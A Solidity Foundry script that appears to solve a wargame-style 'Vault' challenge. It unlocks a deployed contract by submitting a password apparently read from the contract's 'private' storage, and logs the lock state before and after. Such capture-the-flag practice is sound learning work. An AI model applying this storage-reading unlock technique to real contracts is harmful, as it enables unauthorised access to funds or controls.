// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/Ilevel08.sol";

contract POC is Script {
    Vault level8 = Vault(0x198Bf7b324117Da5EFBCbd58f2B23a387134B8a9);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        console.log("Vault is :", level8.locked());
        level8.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        console.log("Vault is :", level8.locked());
        vm.stopBroadcast();
    }
}
